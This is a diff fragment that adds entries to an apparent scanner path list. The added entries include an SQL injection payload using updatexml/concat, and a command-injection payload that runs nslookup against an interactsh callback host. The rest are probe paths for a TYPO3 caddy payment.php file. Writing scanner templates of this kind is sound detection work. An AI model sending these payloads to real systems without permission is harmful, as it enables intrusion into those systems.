@@ -2355,3 +2355,9 @@
 /public/stream?url=http://{{interactsh-url}}/x.mp4
 /wp-json/gutenkit/v1
 /api/version
+/mdiy/dict/listExcludeApp.do?query=1&dictType=1&orderBy=1/**/or/**/updatexml(1,concat(0x7e,md5(
+/rc/?command=shutdown&param=$(nslookup+{{randstr}}.{{interactsh-url}})
+/typo3conf/ext/caddy/Resources/Public/JavaScript/e-payment/paymill/api/php/payment.php
+/typo3conf/ext/caddy/Resources/Public/JavaScript/e-payment/paymill/api/payment.php
+/caddy/Resources/Public/JavaScript/e-payment/paymill/api/php/payment.php
+/typo3plugins/plugins/caddy/Resources/Public/JavaScript/e-payment/paymill/api/php/payment.php
